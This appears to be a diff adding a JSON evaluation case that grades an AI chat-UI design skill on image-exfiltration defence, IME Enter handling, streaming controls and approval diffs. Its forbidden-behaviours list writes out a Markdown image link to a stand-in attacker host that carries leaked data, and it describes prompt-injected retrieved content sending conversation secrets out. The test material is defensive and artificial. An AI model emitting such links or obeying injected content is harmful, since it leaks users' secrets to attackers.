@@ -1,0 +1,43 @@
+{
+  "schemaVersion": 1,
+  "id": "chat-ai-exfiltration-ime-hitl-gate",
+  "skill": "pixelcraft-chat-ui",
+  "title": "Design an enterprise RAG & tool-calling AI workspace with Markdown image exfiltration defense, IME Enter guard, unlocked streaming composer, and HITL diff approval",
+  "contextSnapshot": {
+    "surface": "Enterprise AI support and database-action copilot",
+    "platform": "Web application (HTML/CSS/TypeScript streaming workspace)",
+    "mode": "Collaborate",
+    "states": ["streaming RAG answer with citations", "Japanese/Vietnamese IME composition in composer", "untrusted external Markdown image in retrieved doc", "destructive SQL/API tool call awaiting approval", "429 rate-limit retry countdown", "human agent escalation"],
+    "constraints": ["block untrusted Markdown image exfiltration via CSP img-src / proxy", "preserve editable composer during streaming with Stop AbortController", "guard Enter submit against active IME composition", "show human-readable Before -> After diff on HITL approval cards"]
+  },
+  "prompt": "Build an enterprise AI copilot chat workspace that renders cited RAG answers from untrusted customer tickets, supports Japanese and Vietnamese Telex typing, lets agents approve or reject account-modifying tool calls, handles 429 rate limits, and hands off unresolved threads to a human specialist.",
+  "expectedRouting": ["pixelcraft-chat-ui", "references/agentic-workspace.md", "references/conversation-design.md", "references/ai-ui-libraries.md"],
+  "forbiddenBehaviors": [
+    "auto-loads arbitrary external `![...](https://attacker.tld/leak?q=...)` Markdown images so prompt-injected RAG content exfiltrates conversation secrets",
+    "disables the text composer while streaming (`disabled={isBusy}`) or submits prematurely when pressing Enter to confirm IME candidates (`!event.isComposing` omitted)",
+    "renders blind raw JSON payloads on tool-approval buttons instead of a clear Before -> After impact diff, or yanks scroll position while the user reads earlier messages"
+  ],
+  "rubricDimensions": [
+    {
+      "dimension": "prompt-injection exfiltration defense and input ergonomics",
+      "pass": "blocks/proxies untrusted external Markdown images via strict CSP img-src, guards Enter-to-send with `event.isComposing || event.keyCode === 229`, keeps the composer editable during streaming with an explicit Stop (AbortController) toggle, and sticks scroll only near the bottom",
+      "fail": "renders remote third-party Markdown images automatically, locks the input during streaming, or fires send on IME candidate commit"
+    },
+    {
+      "dimension": "HITL transparency, grounded citations, and recovery/escalation",
+      "pass": "presents Before -> After diffs on destructive tool approvals, links citations to verifiable source passages, formats errors with What/Why/Next + 429 Retry-After countdown, exposes data-retention/delete controls, and transfers context cleanly on human escalation",
+      "fail": "asks users to approve opaque tool calls, invents citation URLs, or dead-ends on rate limits and unresolved intents"
+    }
+  ],
+  "negativeControls": [
+    {
+      "name": "English happy-path chat bubble demo",
+      "input": "streaming markdown text renders smoothly for an English prompt",
+      "mustNot": "claim enterprise readiness without verifying Markdown image exfiltration blocking, IME Enter composition safety, HITL diff cards, and scroll-anchor discipline"
+    }
+  ],
+  "baseline": {
+    "withoutSkill": "renders untrusted Markdown images allowing data exfiltration, disables the input while streaming, breaks Telex/CJK Enter composition, and shows raw JSON tool approvals",
+    "withSkill": "delivers an exfiltration-hardened, IME-safe streaming copilot with unlocked steering, Before -> After HITL approval cards, grounded citations, and warm human escalation"
+  }
+}
